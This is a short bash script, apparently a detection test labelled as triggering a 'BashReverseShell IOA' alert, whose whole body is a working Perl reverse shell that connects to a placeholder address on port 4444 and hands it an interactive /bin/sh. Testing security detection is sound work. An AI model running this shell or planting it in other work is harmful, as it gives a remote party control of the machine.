#!/bin/bash
# 05 - Reverse Shell (Perl)
# Trigger: BashReverseShell IOA
# Tactic: C2 / Remote Access Tools
set -e
echo "=== [05] Reverse Shell (Perl) ==="

perl -e '
use Socket;
my $ip = "192.0.2.1";
my $port = 4444;
socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
my $addr = sockaddr_in($port, inet_aton($ip));
connect(S, $addr);
open(STDIN, ">&S");
open(STDOUT, ">&S");
open(STDERR, ">&S");
exec("/bin/sh -i");
' 2>/dev/null || true

echo "[05] Done — BashReverseShell IOA should trigger"
